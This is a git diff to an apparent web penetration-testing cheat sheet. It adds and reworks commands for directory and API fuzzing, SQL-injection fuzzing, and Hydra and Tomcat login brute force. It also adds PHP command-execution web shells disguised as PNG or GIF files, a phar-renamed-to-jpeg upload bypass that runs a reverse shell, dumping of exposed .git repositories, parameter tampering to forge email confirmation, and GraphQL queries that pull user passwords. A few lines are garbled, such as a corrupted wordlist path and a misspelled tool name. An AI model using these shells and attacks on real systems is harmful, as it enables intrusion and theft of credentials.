@@ -9,27 +9,27 @@ sudo nmap -p80 --script=http-enum $ip
 3. Brute force directories, subdomains, files and apis
 ```bash
 # /opt/SecLists/Discovery/Web-Content/combined_directories-lowercase.txt
-gobuster dir -u http://loopback:9000 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -k -t 30
-wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_directories-lowercase.txt --hc 404 "http://jeeves.htb:50000/FUZZ/"
-wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://editorial.htb/FUZZ"
-gobuster dir -u http://$ip -w /opt/SecLismember_home.jspts/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x php,txt,html,whatever
+gobuster dir -u http://$url:9000 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -k -t 30
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_directories-lowercase.txt --hc 404 "http://$url:50000/FUZZ/"
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://$url/FUZZ"
+gobuster dir -u $url -w /opt/SecLismember_home.jspts/Discovery/Web-Content/raft-large-files.txt -k -t 30 -x php,txt,html,whatever
 # for api busting
 cp /opt/SecLists/Discovery/Web-Content/api/objects.txt apis
 sed -i 's/^/{GOBUSTER}\//' apis
-gobuster dir -u http://$ip:5002 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -p apis
+gobuster dir -u $url:5002 -w /opt/SecLists/Discovery/Web-Content/combined_directories.txt -p apis
 # If you get hits, try to discover more directories using a smaller wordlist
 
 # Once you have the hostname, search for vhost
-feroxbuster -k -u https://streamio.htb -x php -o streamio.htb.feroxbuster -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
+feroxbuster -k -u $url -x php -o streamio.htb.feroxbuster -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
 [Enter] -> c -f {number of search to cancel}
 
 # Subdomains
-gobuster dns -d soccer.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
-python dome.py -m active -d nagoya-industries.com -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
+gobuster dns -d $dom -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
+python dome.py -m active -d $dom -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 
-java -jar iis_shortname_scanner.jar $domurl/ /opt/windows/IIS-ShortName-Scanner/release/config.xml
+java -jar iis_shortname_scanner.jar $url/ /opt/windows/IIS-ShortName-Scanner/release/config.xml
 cd /opt/windows/sns && go run main.go -u http://nagoya.nagoya-industries.com
-ffuf -k -u "$domurl/FUZZ" -w /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt -fs 106
+ffuf -k -u "$url/FUZZ" -w /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt -fs 106
 /opt/SecLists/Discovery/Web-Content/content_discovery_all.txt
 
 # Fuzzing APIs
@@ -39,8 +39,9 @@ wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt --
 wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_words.txt --hc 404 $url/FUZZ
 ffuf -k -u $url/api/FUZZ -w /home/kali/repos/offsec/lists/lil-fuzz.txt
 ffuf -k -u $url/api/FUZZ -w /home/kali/repos/offsec/lists/sqli.txt
+fuff -u $url/weather/forecast?city=\'FUZZ-- -w /opt/SecLists/Fuzzing/special-characters.txt -mc 200,500 -fw 9
 curl -X POST -H 'Content-Type: application/json' --data '{"user": "admin", "url", "http://192.168.45.178/update"}' http://192.168.193.134:13337/update
-curl -si --data '{"user": "admin", "url", "http://192.168.45.178/update"}' http://192.168.193.134:13337/updat
+curl -si --data '{"user": "admin", "url", "http://192.168.45.178/update"}'$url:13337/update
 ```
 4. Nikto
 ```bash
@@ -279,6 +280,30 @@ kali@kali:~$ curl http://example.com/subdir/uploads/simple-backdoor.pHP?cmd=powe
 echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
 echo '<?php system($_REQUEST['cmd']); ?>' >> mime_shell.php.png
 ```
+
+#### Bypassing File Upload Extension with Phar
+
+Phar is basicaly a zip that allows you to navigate to files within and execute with PHP. You can simply rename the phar to another extension name, such as jpeg.
+
+Note that is your php reverse shell isn't working, but you can echo strings, check phpinfo() for disable_functions and see what you're able to run. An example of proc_open is in scripts directory.
+
+
+```bash
+zip test.phar reverse.php
+mv test.phar test.jpeg
+
+GET /?page=phar://uploads/test.jpeg/reverse
+```
+
+#### Uploading "GIF"
+
+If you have the "GIF89a;" at the beginning, you may be able to bypass blacklists.
+
+```bash
+GIF89a;
+<?php system($_GET["cmd"]); ?
+```
+
 19. File Upload Vulns (Non-Executable)
 
 - When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.
@@ -442,6 +467,12 @@ hydra -l user -P pwdpath ip http-get
 hydra -L user.txt -P pass.txt 10.10.123.83 http-post-form "/Account/login.aspx:__VIEWSTATE=hRiqPHaIdHtHLPKokY59%2B3WUD9ZtsmFSLG55rJABKbT96KUnil6PSus2s75rJc8vTAE%2FEwshWpfpFAiJph7q2PzNZ37cCzPieJzYqs9QMUT947ZVfG7IbjK6qCzrjcKpMsqoov6Ux5RgPM9%2FW7IoWO8%2FXpP7Nbs7NS6xWBQr7s%2B1oUL%2B&__EVENTVALIDATION=fPja7KnrVpkm0bLBQSRGAe%2FmniIYroH63YCNKLdpLMgJN1lAWkehyJsp7MO1wKFsmMrrrm2IU594ajRCbyTN06CR2ew3apQGWSgeYHFacGYWD7509OV%2BqPO3wYCge9Jxl7MSgI%2Fny5yRTI30DifQFZDuopQAKaObXPbgfpYF3EA6UR8K&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
 ```
 
+For Tomcat.
+
+```bash
+python tomcat-login.py -H $ip -P http -m /manager/html -p 8080
+```
+
 #### Hydra for Base64 encoded login
 
 ```bash
@@ -458,9 +489,64 @@ hydra -I -f -L usernames.txt -P custom-wordlist.txt 'http-post-form://$ip:8081/s
 hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://$ip:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
 ```
 
+#### Exposed Git Repo from URL
+
+```bash
+wget -r -np -nH --cut-dirs=1 -R "index.html*" http://192.168.211.144/.git/
+# or
+python3 /opt/git-dumper/git_dumper.py http://192.168.211.144/.git .
+```
+
+Then, do:
+
+```bash
+git log
+git show <each commit>
+```
+
+Check .htaccess, see if there are any special Headers that you need to supply, check whether there is anything mentioning virtual hosts.
+
+To modify vhost you would switch "Host: 10.10.11.177" to "Host: dev.siteisup.htb".
+
 #### Finding Root Directory
 
 Refer to 'https://github.com/fuzzdb-project/fuzzdb/tree/master/discovery/predictable-filepaths/webservers-appservers' for application specific seen locations.
+
+#### Automatically Adding Custom Header in BurpSuite
+
+Go to Proxy > Options > Scroll Down to Match and Replace > Add the header in Replace section
+
+#### Modifying Parameters for Login Portals , BurpSuite
+
+Take the time to review any account login information in BurpSuite. Look at the response.. in the scenario that you're creating a new account and there's an email verification, is there a parameter "confirmed" that decides if it recognizes you? Hijack the email parameter:
+
+```bash
+// Before
+_method=patch&authenticity_token=sqroxonHHHMVjShpvoFQxdQaO5lP9Z-w_XCLkSzgHY9UDTziioXABz5UKg8E0pO7qUVlzkDlK6WfwSjluHnkMQ&user%5Bemail%5D=test2%40test.test&commit=Change%20email
+
+//After
+_method=patch&authenticity_token=RSv5NyN2tJJgQcgbwtyWzA7oHYcTW4dSZNsLoHuASc-jjC0TIDRo5kuYyn14j1Wyc7dD0BxLM0cGaqjU7xmwcQ&user%5Bconfirmed%5D=True&commit=Change%20email
+```
+
+
+#### GraphQL
+
+Navigate to "http://site.com/graphql/". Then, you want to extract information.
+
+```bash
+{__schema {
+   types {
+      name
+      kind
+      description
+      fields {
+         name
+      }
+   }
+}}
+```
+
+Url encode that, then query it within the url, "http://site.com/graphql?query=%7B__schema%20%7B%0A%20%20%20types%20%7B%0A%20%20%20%20%20%20name%0A%20%20%20%20%20%20kind%0A%20%20%20%20%20%20description%0A%20%20%20%20%20%20fields%20%7B%0A%20%20%20%20%20%20%20%20%20name%0A%20%20%20%20%20%20%7D%0A%20%20%20%7D%0A%7D%7D". Say there's a user object with a password and you want to query what it is, you can do that by putting "{ user { username, password } }"
 
 
 Example post request.
